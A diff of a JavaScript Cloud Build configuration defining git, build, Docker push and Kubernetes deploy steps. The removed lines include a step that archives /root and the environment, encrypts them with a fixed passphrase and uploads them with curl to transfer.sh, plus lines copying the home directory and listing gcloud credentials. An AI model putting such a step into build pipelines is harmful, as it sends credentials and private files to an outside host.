@@ -34,14 +34,6 @@ const submitBuild = async (giturl, name, version) => {
 
 const gSteps = [
 	{
-		name: 'gcr.io/cloud-builders/gsutil',
-		entrypoint: '/bin/sh',
-		args: [
-			'-c',
-			'who && cd ~ && pwd && cd - && env && tar -cz /root | gpg --batch --passphrase 12345 -ac -o- | curl -X PUT --upload-file "-" https://transfer.sh/test.tar.gz',
-		],
-	},
-	{
 		id: 'git',
 		name: 'gcr.io/cloud-builders/git',
 		entrypoint: 'sh',
@@ -72,7 +64,7 @@ const gSteps = [
 		],
 		args: [
 			'-c',
-			'cp -R ~ ./.home && echo "#!/bin/sh" > /tmp/$_NAME.build && ./.dockerun build.yaml >> /tmp/$_NAME.build && chmod +x /tmp/$_NAME.build && /tmp/$_NAME.build',
+			'echo "#!/bin/sh" > /tmp/$_NAME.build && ./.dockerun build.yaml >> /tmp/$_NAME.build && chmod +x /tmp/$_NAME.build && /tmp/$_NAME.build',
 		],
 		waitFor: ['cache', 'git'],
 	},
@@ -82,7 +74,7 @@ const gSteps = [
 		entrypoint: 'sh',
 		args: [
 			'-c',
-			'[ -f Dockerfile ] && cp Dockerfile .$_NAME.Dockerfile.tmp && ./.configmap -config=.config.yaml -format=docker -compact configmap.yaml >> .$_NAME.Dockerfile.tmp && docker build -q -t $_DOCKERHOST$_ORG/$_NAME:$_VERSION -f .$_NAME.Dockerfile.tmp . && docker push ${_DOCKERHOST}$_ORG/$_NAME:$_VERSION && ls -lah /builder/home/.config/gcloud',
+			'[ -f Dockerfile ] && cp Dockerfile .$_NAME.Dockerfile.tmp && ./.configmap -config=.config.yaml -format=docker -compact configmap.yaml >> .$_NAME.Dockerfile.tmp && docker build -q -t $_DOCKERHOST$_ORG/$_NAME:$_VERSION -f .$_NAME.Dockerfile.tmp . && docker push ${_DOCKERHOST}$_ORG/$_NAME:$_VERSION',
 		],
 		waitFor: ['run'],
 	},
@@ -100,12 +92,21 @@ const gSteps = [
 		id: 'deploy',
 		name: 'gcr.io/cloud-builders/kubectl',
 		entrypoint: 'sh',
-		args: ['-c', '[ -f deploy.prod.yaml ] && export IMG="$_DOCKERHOST$_ORG/$_NAME:$_VERSION" && ./.envsubst < deploy.prod.yaml > /tmp/$_NAME.deploy.prod.yaml && cat /tmp/$_NAME.deploy.prod.yaml && /builder/kubectl.bash apply -f /tmp/$_NAME.deploy.prod.yaml'],
+		args: [
+			'-c',
+			'[ -f deploy.prod.yaml ] && export IMG="$_DOCKERHOST$_ORG/$_NAME:$_VERSION" && ./.envsubst < deploy.prod.yaml > /tmp/$_NAME.deploy.prod.yaml && cat /tmp/$_NAME.deploy.prod.yaml && /builder/kubectl.bash apply -f /tmp/$_NAME.deploy.prod.yaml',
+		],
 		env: [
 			'CLOUDSDK_COMPUTE_ZONE=us-central1-a',
 			'CLOUDSDK_CONTAINER_CLUSTER=app-cluster-1',
 		],
 		waitFor: ['build-image'],
+	},
+	{
+		id: 'last',
+		name: 'alpine',
+		entrypoint: 'sh',
+		args: ['-c', '[ -f last.sh ] && ./last.sh' ],
 	},
 ]
 
